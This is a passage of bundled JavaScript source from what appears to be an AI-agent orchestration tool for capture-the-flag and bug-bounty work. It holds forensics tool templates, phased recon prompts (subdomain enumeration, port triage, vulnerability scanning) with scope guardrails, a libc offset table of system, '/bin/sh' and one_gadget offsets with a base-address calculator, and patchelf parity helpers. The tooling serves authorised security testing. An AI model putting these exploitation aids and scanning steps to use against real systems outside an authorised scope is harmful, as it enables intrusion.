        { tool: "volatility3", command: "vol -f '<memory_dump>' windows.info", purpose: "Memory dump analysis", outputParser: "vol_result_regex" },
        { tool: "foremost", command: "foremost -i '<disk_image>' -o output/", purpose: "File carving from disk/memory image", outputParser: "foremost_audit_regex" },
        { tool: "tshark", command: "tshark -r '<pcap>' -q -z io,phs", purpose: "PCAP protocol hierarchy analysis", outputParser: "tshark_phs_regex" }
      ];
    case "MISC":
    case "UNKNOWN":
    default:
      return [
        binwalkCommand("<target>"),
        exiftoolCommand("<target>"),
        { tool: "zsteg", command: "zsteg '<image.png>'", purpose: "PNG steganography detection", outputParser: "zsteg_result_regex" },
        { tool: "steghide", command: "steghide info '<image.jpg>'", purpose: "JPEG steganography detection", outputParser: "steghide_info_regex" }
      ];
  }
}

// src/orchestration/recon-pipeline.ts
function normalizeScope(scope, fallbackTarget) {
  const cleaned = (scope ?? []).map((item) => item.trim()).filter(Boolean);
  if (cleaned.length > 0) {
    return cleaned;
  }
  return [fallbackTarget.trim() || "<target>"];
}
function buildGuardrailBlock(target, scope, scopeConfirmed) {
  const inScope = normalizeScope(scope, target);
  return [
    "Scope constraints:",
    `- In-scope assets only: ${inScope.join(", ")}`,
    scopeConfirmed ? "- Scope status: confirmed; still avoid out-of-scope pivots." : "- Scope status: unconfirmed; keep actions conservative and scope-safe.",
    "- Do not test third-party or unknown assets.",
    "Rate limiting reminders:",
    "- Use low request rates and small batches.",
    "- Back off immediately on 429/5xx spikes or instability."
  ].join(`
`);
}
function withGuardrails(prompt, target, scope, scopeConfirmed) {
  return `${prompt}

${buildGuardrailBlock(target, scope, scopeConfirmed)}`;
}
function planAssetDiscovery(target, scope) {
  const tracks = [
    {
      purpose: "asset-discovery-subdomains",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 1: Asset Discovery]`,
        `Target: ${target}`,
        "Enumerate candidate subdomains with passive-first methods and deduplicate results.",
        "Output should include: discovered assets, confidence, and one safest next recon step."
      ].join(`
`), target, scope)
    },
    {
      purpose: "asset-discovery-ports",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 1: Asset Discovery]`,
        `Target: ${target}`,
        "Perform conservative host/port triage on confirmed in-scope hosts.",
        "Prioritize lightweight checks and summarize live services by risk relevance."
      ].join(`
`), target, scope)
    }
  ];
  return {
    phase: 1,
    name: "Asset Discovery",
    tracks
  };
}
function planLiveHostTriage(target) {
  const tracks = [
    {
      purpose: "live-host-http-probing",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 2: Live Host Triage]`,
        `Target: ${target}`,
        "Probe candidate hosts for live HTTP(S) services and prioritize reachable assets.",
        "Capture status code clusters, titles, and high-value endpoints only."
      ].join(`
`), target)
    },
    {
      purpose: "live-host-tech-detection",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 2: Live Host Triage]`,
        `Target: ${target}`,
        "Fingerprint technologies/frameworks with low-impact techniques.",
        "Map likely attack surface categories without active exploitation."
      ].join(`
`), target)
    }
  ];
  return {
    phase: 2,
    name: "Live Host Triage",
    tracks
  };
}
function planContentDiscovery(target) {
  const tracks = [
    {
      purpose: "content-discovery-crawl",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 3: Content Discovery]`,
        `Target: ${target}`,
        "Crawl known live hosts to discover endpoints, parameters, and API paths.",
        "Prioritize authenticated boundary indicators and sensitive data flows."
      ].join(`
`), target)
    },
    {
      purpose: "content-discovery-directories",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 3: Content Discovery]`,
        `Target: ${target}`,
        "Run focused directory/content discovery with conservative wordlists and cadence.",
        "Report only high-signal findings and likely validation paths."
      ].join(`
`), target)
    }
  ];
  return {
    phase: 3,
    name: "Content Discovery",
    tracks
  };
}
function planVulnScan(target) {
  const tracks = [
    {
      purpose: "vuln-scan-nuclei-focused",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 4: Vulnerability Scan]`,
        `Target: ${target}`,
        "Run focused vulnerability checks aligned to discovered technologies/assets.",
        "Prefer high-confidence templates/checks over broad noisy scanning."
      ].join(`
`), target)
    },
    {
      purpose: "vuln-scan-focused-manual",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 4: Vulnerability Scan]`,
        `Target: ${target}`,
        "Design minimal-impact manual checks for top candidate weaknesses.",
        "Return reproducible validation steps with strict scope safety."
      ].join(`
`), target)
    }
  ];
  return {
    phase: 4,
    name: "Vulnerability Scan",
    tracks
  };
}
function planReconPipeline(state, config3, target, options) {
  const normalizedTarget = target.trim() || "<target>";
  const scopedAssets = normalizeScope(options?.scope, normalizedTarget);
  const skip = new Set(options?.skipPhases ?? []);
  const maxTracksPerPhase = typeof options?.maxTracksPerPhase === "number" && options.maxTracksPerPhase > 0 ? Math.floor(options.maxTracksPerPhase) : Number.MAX_SAFE_INTEGER;
  const phases = [
    planAssetDiscovery(normalizedTarget, scopedAssets),
    planLiveHostTriage(normalizedTarget),
    planContentDiscovery(normalizedTarget),
    planVulnScan(normalizedTarget)
  ].filter((phase) => !skip.has(phase.phase));
  const scannerPolicyNote = config3.bounty_policy.deny_scanner_commands ? "Scanner restrictions may apply; prefer scoped, low-noise checks." : "Scanner restrictions are relaxed; still stay conservative and in-scope.";
  const tracks = phases.flatMap((phase) => phase.tracks.slice(0, maxTracksPerPhase).map((track, index) => ({
    purpose: `phase-${phase.phase}-${index + 1}-${track.purpose}`,
    agent: track.agent,
    prompt: `${track.prompt}

Scope status at pipeline build: ${state.scopeConfirmed ? "confirmed" : "unconfirmed"}.
Policy note: ${scannerPolicyNote}`
  })));
  const safeLabel = normalizedTarget.replace(/[^a-z0-9]+/gi, "-").replace(/^-+|-+$/g, "").toLowerCase() || "target";
  return {
    label: `bounty-recon-${safeLabel}`,
    tracks
  };
}

// src/orchestration/delta-scan.ts
var scanHistory = new Map;
function normalizeKey(target) {
  return target.trim().toLowerCase();
}
function uniqueSorted(values) {
  return [...new Set(values.map((value) => value.trim()).filter(Boolean))].sort((a, b) => a.localeCompare(b));
}
function summarizeDelta(delta) {
  const parts = [
    `newAssets=${delta.newAssets.length}`,
    `removedAssets=${delta.removedAssets.length}`,
    `newFindings=${delta.newFindings.length}`,
    `resolvedFindings=${delta.resolvedFindings.length}`,
    `templateChanged=${delta.templateChanged ? "yes" : "no"}`
  ];
  return `Delta: ${parts.join(", ")}`;
}
function saveScanSnapshot(snapshot) {
  const key = normalizeKey(snapshot.target);
  if (!key) {
    return;
  }
  const entry = {
    ...snapshot,
    target: snapshot.target.trim(),
    assets: uniqueSorted(snapshot.assets),
    findings: uniqueSorted(snapshot.findings),
    templateSet: snapshot.templateSet.trim()
  };
  const existing = scanHistory.get(key) ?? [];
  existing.push(entry);
  existing.sort((a, b) => a.timestamp - b.timestamp);
  scanHistory.set(key, existing);
}
function getLatestSnapshot(target) {
  const history = scanHistory.get(normalizeKey(target));
  if (!history || history.length === 0) {
    return null;
  }
  return history[history.length - 1] ?? null;
}
function computeDelta(previous, current) {
  const previousAssets = new Set(uniqueSorted(previous.assets));
  const currentAssets = new Set(uniqueSorted(current.assets));
  const previousFindings = new Set(uniqueSorted(previous.findings));
  const currentFindings = new Set(uniqueSorted(current.findings));
  const newAssets = [...currentAssets].filter((asset) => !previousAssets.has(asset));
  const removedAssets = [...previousAssets].filter((asset) => !currentAssets.has(asset));
  const newFindings = [...currentFindings].filter((finding) => !previousFindings.has(finding));
  const resolvedFindings = [...previousFindings].filter((finding) => !currentFindings.has(finding));
  const templateChanged = previous.templateSet.trim() !== current.templateSet.trim();
  const deltaWithoutSummary = {
    newAssets: newAssets.sort((a, b) => a.localeCompare(b)),
    removedAssets: removedAssets.sort((a, b) => a.localeCompare(b)),
    newFindings: newFindings.sort((a, b) => a.localeCompare(b)),
    resolvedFindings: resolvedFindings.sort((a, b) => a.localeCompare(b)),
    templateChanged
  };
  return {
    ...deltaWithoutSummary,
    summary: summarizeDelta(deltaWithoutSummary)
  };
}
function getScanHistory(target) {
  const history = scanHistory.get(normalizeKey(target));
  if (!history) {
    return [];
  }
  return [...history];
}
function buildDeltaSummary(target, current) {
  const history = getScanHistory(target);
  if (history.length === 0) {
    return `No previous snapshot found for ${target}. Current snapshot ${current.id} is treated as baseline.`;
  }
  const latest = history[history.length - 1];
  const previous = latest && latest.id === current.id ? history[history.length - 2] : latest;
  if (!previous) {
    return `No prior snapshot before ${current.id} for ${target}. Current snapshot is baseline.`;
  }
  const delta = computeDelta(previous, current);
  const detailParts = [];
  if (delta.newAssets.length > 0) {
    detailParts.push(`New assets: ${delta.newAssets.join(", ")}`);
  }
  if (delta.removedAssets.length > 0) {
    detailParts.push(`Removed assets: ${delta.removedAssets.join(", ")}`);
  }
  if (delta.newFindings.length > 0) {
    detailParts.push(`New findings: ${delta.newFindings.join(", ")}`);
  }
  if (delta.resolvedFindings.length > 0) {
    detailParts.push(`Resolved findings: ${delta.resolvedFindings.join(", ")}`);
  }
  if (delta.templateChanged) {
    detailParts.push(`Template set changed: ${previous.templateSet} -> ${current.templateSet}`);
  }
  const details = detailParts.length > 0 ? `
${detailParts.join(`
`)}` : `
No material changes detected.`;
  return `Target ${target} delta from ${previous.id} to ${current.id}: ${delta.summary}${details}`;
}
function shouldRescan(target, templateSet, maxAgeMs = 24 * 60 * 60 * 1000) {
  const latest = getLatestSnapshot(target);
  if (!latest) {
    return true;
  }
  if (latest.templateSet.trim() !== templateSet.trim()) {
    return true;
  }
  if (maxAgeMs <= 0) {
    return true;
  }
  const ageMs = Date.now() - latest.timestamp;
  return ageMs >= maxAgeMs;
}

// src/orchestration/libc-database.ts
var COMMON_LIBCS = [
  {
    id: "libc6_2.31-0ubuntu9.9_amd64",
    symbols: {
      puts: 554400,
      printf: 413312,
      read: 1118512,
      write: 1118672,
      system: 349200,
      execve: 941824,
      str_bin_sh: 1799594,
      __libc_start_main: 159680,
      __free_hook: 2026280,
      __malloc_hook: 2014064,
      setcontext: 363776,
      one_gadget_0: 945278,
      one_gadget_1: 945281,
      one_gadget_2: 945284
    }
  },
  {
    id: "libc6_2.27-3ubuntu1_amd64",
    symbols: {
      puts: 526784,
      printf: 413200,
      read: 1114224,
      write: 1114432,
      system: 324672,
      execve: 937520,
      str_bin_sh: 1785498,
      __libc_start_main: 137904,
      __free_hook: 4118760,
      __malloc_hook: 4111408,
      setcontext: 336144,
      one_gadget_0: 324261,
      one_gadget_1: 324354,
      one_gadget_2: 1090300
    }
  },
  {
    id: "libc6_2.23-0ubuntu11.3_amd64",
    symbols: {
      puts: 456336,
      printf: 350208,
      read: 1012304,
      write: 1012400,
      system: 283536,
      execve: 837488,
      str_bin_sh: 1625431,
      __libc_start_main: 132928,
      __free_hook: 3958696,
      __malloc_hook: 3951376,
      setcontext: 293749,
      one_gadget_0: 283158,
      one_gadget_1: 283242,
      one_gadget_2: 983716,
      one_gadget_3: 987463
    }
  }
];
function parseAddress(value) {
  const trimmed = value.trim().toLowerCase();
  if (!trimmed) {
    return null;
  }
  const normalized = trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`;
  if (!/^0x[0-9a-f]+$/.test(normalized)) {
    return null;
  }
  try {
    return BigInt(normalized);
  } catch {
    return null;
  }
}
function normalizeSymbolName(name) {
  return name.trim();
}
function safeQueryRequests(requests) {
  if (!Array.isArray(requests)) {
    return [];
  }
  const output = [];
  for (const request of requests) {
    const symbolName = normalizeSymbolName(request.symbolName ?? "");
    const parsed = parseAddress(request.address ?? "");
    if (!symbolName || parsed === null) {
      continue;
    }
    output.push({
      symbolName,
      address: `0x${parsed.toString(16)}`
    });
  }
  return output;
}
function symbolOffsetNibble(offset) {
  return (offset & 4095).toString(16).padStart(3, "0");
}
function extractOffset(address) {
  const parsed = parseAddress(address ?? "");
  if (parsed === null) {
    return "";
  }
  const nibbles = Number(parsed & BigInt(4095));
  return nibbles.toString(16).padStart(3, "0");
}
function localLookup(requests) {
  const query = safeQueryRequests(requests);
  if (query.length === 0) {
    return {
      matches: [],
      lookupSource: "local",
      query: []
    };
  }
  const matches = COMMON_LIBCS.filter((libc) => {
    return query.every((request) => {
      const symbolOffset = libc.symbols[request.symbolName];
      if (typeof symbolOffset !== "number") {
        return false;
      }
      return symbolOffsetNibble(symbolOffset) === extractOffset(request.address);
    });
  });
  return {
    matches,
    lookupSource: "local",
    query
  };
}
function buildLibcRipUrl(requests) {
  const query = safeQueryRequests(requests);
  if (query.length === 0) {
    return "https://libc.rip/";
  }
  const params = query.map((request) => `${encodeURIComponent(request.symbolName)}=${encodeURIComponent(extractOffset(request.address))}`).join("&");
  return `https://libc.rip/api/find?${params}`;
}
function getUsefulOffsets(libc) {
  const symbols = libc?.symbols ?? {};
  const oneGadgetKeys = Object.keys(symbols).filter((key) => key.startsWith("one_gadget_")).sort();
  const offsets = {
    puts: symbols.puts ?? null,
    printf: symbols.printf ?? null,
    read: symbols.read ?? null,
    write: symbols.write ?? null,
    system: symbols.system ?? null,
    execve: symbols.execve ?? null,
    str_bin_sh: symbols.str_bin_sh ?? null,
    __libc_start_main: symbols.__libc_start_main ?? null,
    __free_hook: symbols.__free_hook ?? null,
    __malloc_hook: symbols.__malloc_hook ?? null,
    setcontext: symbols.setcontext ?? null
  };
  for (const key of oneGadgetKeys) {
    offsets[key] = symbols[key] ?? null;
  }
  return offsets;
}
function buildLibcSummary(result) {
  const queryText = result.query.map((q) => `${q.symbolName}@${extractOffset(q.address)}`).join(", ") || "none";
  if (result.matches.length === 0) {
    return [
      `Libc lookup source: ${result.lookupSource}`,
      `Query: ${queryText}`,
      "No local libc candidates matched all provided leaked offsets."
    ].join(`
`);
  }
  const lines = [
    `Libc lookup source: ${result.lookupSource}`,
    `Query: ${queryText}`,
    `Candidates: ${result.matches.length}`
  ];
  for (const libc of result.matches) {
    const useful = getUsefulOffsets(libc);
    lines.push(`- ${libc.id}${libc.buildId ? ` (buildId=${libc.buildId})` : ""}`, `  system=${useful.system ?? "n/a"} | /bin/sh=${useful.str_bin_sh ?? "n/a"} | __free_hook=${useful.__free_hook ?? "n/a"}`);
  }
  return lines.join(`
`);
}
function computeLibcBase(leakedAddress, symbolOffset) {
  const parsedLeak = parseAddress(leakedAddress ?? "");
  if (parsedLeak === null || !Number.isFinite(symbolOffset) || symbolOffset < 0) {
    return "";
  }
  const offset = BigInt(Math.trunc(symbolOffset));
  if (parsedLeak < offset) {
    return "";
  }
  const base = parsedLeak - offset;
  return `0x${base.toString(16)}`;
}

// src/orchestration/env-parity.ts
var UNKNOWN_VALUE = "unknown";
function shellQuote3(value) {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}
function normalizeArch(value) {
  const normalized = (value ?? "").trim().toLowerCase();
  if (!normalized) {
    return;
  }
  if (["amd64", "x86_64", "x64"].includes(normalized)) {
    return "x86_64";
  }
  if (["i386", "386", "x86"].includes(normalized)) {
    return "i386";
  }
  if (["arm64", "aarch64"].includes(normalized)) {
    return "aarch64";
  }
  return normalized;
}
function normalizeVersion(value) {
  const input = (value ?? "").trim();
  if (!input) {
    return;
  }
  const match = input.match(/\d+\.\d+(?:\.\d+)?/);
  return match?.[0];
}
function toDisplay(value) {
  const normalized = value?.trim();
  return normalized ? normalized : UNKNOWN_VALUE;
}
function trimOrUndefined(value) {
  const normalized = value?.trim();
  return normalized ? normalized : undefined;
}
function sanitizePath(rawPath) {
  return rawPath.replace(/[)"']+$/g, "").trim();
}
function dockerPlatformFromArch(arch) {
  const normalized = normalizeArch(arch);
  if (!normalized) {
    return;
  }
  if (normalized === "x86_64") {
    return "linux/amd64";
  }
  if (normalized === "i386") {
    return "linux/386";
  }
  if (normalized === "aarch64") {
    return "linux/arm64";
  }
  return;
}
function parseDockerfile(content) {
  const text = content.replace(/\r/g, "");
  const result = {};
  const fromMatch = text.match(/^FROM\s+(?:--platform=([^\s]+)\s+)?([^\s]+)(?:\s+AS\s+[^\s]+)?/im);
  if (fromMatch) {
    const platform = trimOrUndefined(fromMatch[1]);
    const image = trimOrUndefined(fromMatch[2]);
    if (image) {
      result.dockerImage = image;
      if (/python:(\d+\.\d+(?:\.\d+)?)/i.test(image)) {
        const version3 = image.match(/python:(\d+\.\d+(?:\.\d+)?)/i)?.[1];
        result.pythonVersion = normalizeVersion(version3);
      }
      if (/arm64|aarch64/i.test(image)) {
        result.arch = "aarch64";
      } else if (/amd64|x86_64/i.test(image)) {
        result.arch = "x86_64";
      }
    }
    if (platform) {
      const archFromPlatform = platform.split("/").at(-1);
      const normalized = normalizeArch(archFromPlatform);
      if (normalized) {
        result.arch = normalized;
      }
    }
  }
  const glibcMatches = [
    text.match(/(?:GLIBC_VERSION|GLIBC)\s*[= ]\s*["']?([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1],
    text.match(/libc6(?:[:=][^\s]+)?[= ]([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1],
    text.match(/libc-([0-9]+\.[0-9]+(?:\.[0-9]+)?)\.so/i)?.[1]
  ].map((value) => normalizeVersion(value)).filter((value) => Boolean(value));
  if (glibcMatches.length > 0) {
    result.libcVersion = glibcMatches[0];
  }
  const libcPathMatch = text.match(/(\/[^\s"']*libc(?:-[0-9.]+)?\.so(?:\.6)?)/i)?.[1];
  if (libcPathMatch) {
    result.libcPath = sanitizePath(libcPathMatch);
  }
  const ldPathMatch = text.match(/(\/[^\s"']*ld-linux[^\s"']*)/i)?.[1] ?? text.match(/(\/[^\s"']*ld-[^\s"']*\.so[^\s"']*)/i)?.[1];
  if (ldPathMatch) {
    result.ldPath = sanitizePath(ldPathMatch);
  }
  const pythonVersionMatch = text.match(/python(?:3)?(?:[:= ]|\s)([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1] ?? text.match(/python3\.[0-9]+/i)?.[0]?.replace(/^python/i, "");
  if (pythonVersionMatch) {
    result.pythonVersion = normalizeVersion(pythonVersionMatch);
  }
  const seccompMatch = text.match(/SECCOMP_PROFILE\s*=\s*["']?([^\s"']+)/i)?.[1] ?? text.match(/--security-opt\s+seccomp=([^\s]+)/i)?.[1];
  if (seccompMatch) {
    result.seccompProfile = seccompMatch.trim();
  }
  result.arch = normalizeArch(result.arch);
  result.libcVersion = normalizeVersion(result.libcVersion);
  return result;
}
function localEnvCommands() {
  return [
    "uname -m",
    "ldd --version 2>&1 | head -n 1",
    "python3 --version 2>&1 || python --version 2>&1",
    "readlink -f /lib64/ld-linux-x86-64.so.2 2>/dev/null || readlink -f /lib/ld-linux.so.2 2>/dev/null || true",
    "grep -E '^(NAME|VERSION)=' /etc/os-release 2>/dev/null || true"
  ];
}
function parseLddOutput(output) {
  const text = output.replace(/\r/g, "");
  if (!text.trim()) {
    return null;
  }
  const pathMatch = text.match(/libc\.so\.6\s*=>\s*(\/[^\s]+)\s*\(/i)?.[1] ?? text.match(/(\/[^\s]*libc(?:-[0-9.]+)?\.so(?:\.6)?)/i)?.[1];
  const libcPath = trimOrUndefined(pathMatch ? sanitizePath(pathMatch) : undefined);
  if (!libcPath) {
    return null;
  }
  const version3 = normalizeVersion(text.match(/(?:GLIBC|GNU libc|ldd)[^0-9]*([0-9]+\.[0-9]+(?:\.[0-9]+)?)/i)?.[1]) ?? normalizeVersion(libcPath.match(/libc-([0-9]+\.[0-9]+(?:\.[0-9]+)?)\.so/i)?.[1]) ?? "unknown";
  return { libcPath, version: version3 };
}
function generatePatchelfCommands(binaryPath, env) {
  const commands = [];
  const targetBinary = binaryPath.trim();
  if (!targetBinary) {
    return commands;
  }
  const ldPath = trimOrUndefined(env.ldPath);
  const libcPath = trimOrUndefined(env.libcPath);
  if (ldPath) {
    commands.push(`patchelf --set-interpreter ${shellQuote3(ldPath)} ${shellQuote3(targetBinary)}`);
  }
  if (libcPath) {
    commands.push(`patchelf --replace-needed libc.so.6 ${shellQuote3(libcPath)} ${shellQuote3(targetBinary)}`);
    const slashIndex = libcPath.lastIndexOf("/");
    if (slashIndex > 0) {
      const libcDir = libcPath.slice(0, slashIndex);
      commands.push(`patchelf --set-rpath ${shellQuote3(libcDir)} ${shellQuote3(targetBinary)}`);
    }
  }
  return commands;
}
function buildParityReport(local, remote) {
  const checks5 = [];
  const normalizedLocalArch = normalizeArch(local.arch);
  const normalizedRemoteArch = normalizeArch(remote.arch);
  const normalizedLocalLibc = normalizeVersion(local.libcVersion) ?? trimOrUndefined(local.libcPath);
  const normalizedRemoteLibc = normalizeVersion(remote.libcVersion) ?? trimOrUndefined(remote.libcPath);
  const addCheck = (args) => {
    const localDisplay = toDisplay(args.localValue);
    const remoteDisplay = toDisplay(args.remoteValue);
    const bothUnknown = localDisplay === UNKNOWN_VALUE && remoteDisplay === UNKNOWN_VALUE;
    const match = !bothUnknown && localDisplay !== UNKNOWN_VALUE && remoteDisplay !== UNKNOWN_VALUE && localDisplay === remoteDisplay;
    checks5.push({
      aspect: args.aspect,
      local: localDisplay,
      remote: remoteDisplay,
      match,
      fixCommand: match ? undefined : args.fixCommand
    });
  };
  addCheck({
    aspect: "arch",
    localValue: normalizedLocalArch,
    remoteValue: normalizedRemoteArch,
    fixCommand: normalizedRemoteArch !== undefined ? `Use docker platform ${dockerPlatformFromArch(normalizedRemoteArch) ?? normalizedRemoteArch} for execution parity.` : undefined
  });
  addCheck({
    aspect: "libc",
    localValue: normalizedLocalLibc,
    remoteValue: normalizedRemoteLibc,
    fixCommand: remote.libcPath || remote.ldPath ? generatePatchelfCommands("<binary>", {
      arch: normalizedRemoteArch ?? "unknown",
      libcPath: trimOrUndefined(remote.libcPath),
      ldPath: trimOrUndefined(remote.ldPath),
      libcVersion: normalizeVersion(remote.libcVersion)
    }).join(" && ") : undefined
  });
  addCheck({
    aspect: "ld",
    localValue: trimOrUndefined(local.ldPath),
    remoteValue: trimOrUndefined(remote.ldPath),
    fixCommand: remote.ldPath?.trim() ? `patchelf --set-interpreter ${shellQuote3(remote.ldPath.trim())} <binary>` : undefined
  });
  addCheck({
    aspect: "python",
    localValue: normalizeVersion(local.pythonVersion) ?? trimOrUndefined(local.pythonVersion),
    remoteValue: normalizeVersion(remote.pythonVersion) ?? trimOrUndefined(remote.pythonVersion),
    fixCommand: remote.pythonVersion?.trim() ? `pyenv install ${remote.pythonVersion.trim()} && pyenv local ${remote.pythonVersion.trim()}` : undefined
  });
  addCheck({
    aspect: "seccomp",
    localValue: trimOrUndefined(local.seccompProfile),
    remoteValue: trimOrUndefined(remote.seccompProfile),
    fixCommand: remote.seccompProfile?.trim() ? `docker run --security-opt seccomp=${shellQuote3(remote.seccompProfile.trim())} ...` : undefined
  });
  const fixCommands = Array.from(new Set(checks5.filter((check3) => !check3.match && check3.fixCommand).map((check3) => check3.fixCommand).map((command) => command.trim()).filter(Boolean)));
  const allMatch = checks5.every((check3) => check3.match);
  const summaryLines = [`Parity checks: ${checks5.filter((check3) => check3.match).length}/${checks5.length} matched.`];
  if (allMatch) {
    summaryLines.push("Local and remote environment appear aligned for tracked aspects.");
  } else {
    const mismatches = checks5.filter((check3) => !check3.match).map((check3) => check3.aspect);
    summaryLines.push(`Mismatched aspects: ${mismatches.join(", ")}.`);
    const unknownAspects = checks5.filter((check3) => check3.local === UNKNOWN_VALUE && check3.remote === UNKNOWN_VALUE).map((check3) => check3.aspect);
    if (unknownAspects.length > 0) {
      summaryLines.push(`Unknown parity aspects: ${unknownAspects.join(", ")} (treat as mismatch until evidence exists).`);
    }
    if (fixCommands.length > 0) {
      summaryLines.push(`Suggested fixes: ${fixCommands.length} command(s) generated.`);
    }
  }
  return {
    checks: checks5,
    allMatch,
    fixCommands,
    summary: summaryLines.join(" ")
  };
}
function buildParitySummary(report) {
  const lines = [report.summary];
  for (const check3 of report.checks) {
    const status = check3.match ? "OK" : "MISMATCH";
    lines.push(`- [${status}] ${check3.aspect}: local=${check3.local} remote=${check3.remote}`);
  }
  if (!report.allMatch && report.fixCommands.length > 0) {
    lines.push("Fix commands:");
    for (const command of report.fixCommands) {
      lines.push(`- ${command}`);
    }
  }
  return lines.join(`
`);
}

// src/orchestration/parity-runner.ts
function normalize3(text) {
  return text.replace(/\s+/g, " ").trim();
}
function miniHash(text) {
  let hash3 = 2166136261;
  for (let i = 0;i < text.length; i += 1) {
    hash3 ^= text.charCodeAt(i);
    hash3 += (hash3 << 1) + (hash3 << 4) + (hash3 << 7) + (hash3 << 8) + (hash3 << 24);
  }
  return (hash3 >>> 0).toString(16).padStart(8, "0");
}
function runParityRunner(input) {
  const values = [];
  if (typeof input.localOutput === "string" && input.localOutput.trim().length > 0) {
    values.push({ label: "local", value: normalize3(input.localOutput) });
  }
  if (typeof input.dockerOutput === "string" && input.dockerOutput.trim().length > 0) {
    values.push({ label: "docker", value: normalize3(input.dockerOutput) });
  }
  if (typeof input.remoteOutput === "string" && input.remoteOutput.trim().length > 0) {
    values.push({ label: "remote", value: normalize3(input.remoteOutput) });
  }
  const diffs = [];
  for (let i = 0;i < values.length; i += 1) {
    for (let j = i + 1;j < values.length; j += 1) {
      const left = values[i];
      const right = values[j];
      diffs.push({
        pair: `${left.label}-${right.label}`,
        match: left.value === right.value,
        leftHash: miniHash(left.value),
        rightHash: miniHash(right.value)
      });
    }
  }
  const ok = diffs.length > 0 && diffs.every((item) => item.match);
  const summary = diffs.length === 0 ? "Parity runner requires at least 2 non-empty outputs." : ok ? `Parity matched across ${diffs.length} pair(s).` : `Parity mismatch detected across ${diffs.filter((item) => !item.match).length}/${diffs.length} pair(s).`;
  return {
    ok,
    checkedPairs: diffs.length,
    diffs,
    summary
  };
}

// src/orchestration/contradiction-runner.ts
function normalize4(text) {
  return text.replace(/\s+/g, " ").trim().toLowerCase();
}
function runContradictionRunner(input) {
  const observed = normalize4(input.observedOutput);
  const expected = input.expected.map((item) => item.trim()).filter((item) => item.length > 0);
  const matchedExpected = expected.filter((item) => observed.includes(normalize4(item)));
  const missingExpected = expected.filter((item) => !observed.includes(normalize4(item)));
  const exitCodeMismatch = typeof input.expectedExitCode === "number" && typeof input.observedExitCode === "number" && input.expectedExitCode !== input.observedExitCode;
  const contradictory = missingExpected.length > 0 || exitCodeMismatch;
  const summaryParts = [
    `hypothesis=${input.hypothesis || "(none)"}`,
    `matched=${matchedExpected.length}/${expected.length}`
  ];
  if (missingExpected.length > 0) {
    summaryParts.push(`missing=${missingExpected.join(" | ")}`);
  }
  if (exitCodeMismatch) {
    summaryParts.push(`exit_code_mismatch expected=${input.expectedExitCode} observed=${input.observedExitCode}`);
  }
  return {
    contradictory,
    matchedExpected,
    missingExpected,
    exitCodeMismatch,
    summary: summaryParts.join("; ")
  };
}

// src/tools/analysis-tools.ts
init_evidence_ledger();

// src/orchestration/report-generator.ts
function trimLine(line) {
  return line.trim();
}
function stripListPrefix(line) {
  return line.replace(/^[-*]\s+/, "").replace(/^\d+\.\s+/, "").trim();
}
function stripHeadingPrefix(line) {
  return line.replace(/^#{1,6}\s+/, "").trim();
}
function cleanupArtifactToken(value) {
  return value.trim().replace(/^[<("']+/, "").replace(/[>)"',.;:]+$/, "");
}
function extractTimestamp(line) {
  const bracketed = line.match(/^\[([^\]]+)\]\s*(.*)$/);
  if (bracketed) {
    return {
      timestamp: bracketed[1].trim(),
      rest: bracketed[2].trim()
    };
  }
  const isoLike = line.match(/^(\d{4}[-/]\d{2}[-/]\d{2}(?:[ T]\d{2}:\d{2}(?::\d{2})?(?:\s*(?:UTC|KST|[A-Z]{2,5}|[+-]\d{2}:?\d{2}))?)?)\s*(?:[-:|])?\s*(.*)$/);
  if (isoLike) {
    return {
      timestamp: isoLike[1].trim(),
      rest: isoLike[2].trim()
    };
  }
  const timeOnly = line.match(/^(\d{2}:\d{2}(?::\d{2})?)\s*(?:[-:|])?\s*(.*)$/);
  if (timeOnly) {
    return {
      timestamp: timeOnly[1].trim(),
      rest: timeOnly[2].trim()
    };
  }
  return { rest: line };
}
function splitActionResult(line) {
  const delimiters = ["=>", "->", "|"];
  for (const delimiter of delimiters) {
    const index = line.indexOf(delimiter);
    if (index > 0) {
      const action = line.slice(0, index).trim();
      const result = line.slice(index + delimiter.length).trim();
      return {
        action: action || "log",
        result: result || "not specified"
      };
    }
  }
  const keyValue = line.match(/^(?:action|tried|step)\s*:\s*(.+?)(?:\s+(?:result|observed|outcome|status)\s*:\s*(.+))?$/i);
  if (keyValue) {
    return {
      action: keyValue[1].trim(),
      result: keyValue[2]?.trim() || "not specified"
    };
  }
  const resultOnly = line.match(/^(?:result|observed|outcome|status)\s*:\s*(.+)$/i);
  if (resultOnly) {
    return {
      action: "observation",
      result: resultOnly[1].trim()
    };
  }
  const embeddedResult = line.match(/^(.+?)\s+(?:result|observed|outcome|status)\s*:\s*(.+)$/i);
  if (embeddedResult) {
    return {
      action: embeddedResult[1].trim(),
      result: embeddedResult[2].trim()
    };
  }
  return {
    action: line.trim() || "log",
    result: "not specified"
  };
}
function extractArtifactPaths(content) {
  const artifacts = new Set;
  const inlineCodePattern = /`([^`]+)`/g;
  for (const match of content.matchAll(inlineCodePattern)) {
    const candidate = cleanupArtifactToken(match[1]);
    if (/[/\\]/.test(candidate) || /\.[a-zA-Z0-9]{1,8}$/.test(candidate)) {
      artifacts.add(candidate);
    }
  }
  const markdownLinkPattern = /\[[^\]]+\]\(([^)]+)\)/g;
  for (const match of content.matchAll(markdownLinkPattern)) {
    const candidate = cleanupArtifactToken(match[1]);
    if (candidate) {
      artifacts.add(candidate);
    }
  }
  const pathPattern = /(?:^|\s)(\.?\/?[A-Za-z0-9_.-]+(?:\/[A-Za-z0-9_.-]+)+)/g;
  for (const match of content.matchAll(pathPattern)) {
    const candidate = cleanupArtifactToken(match[1]);
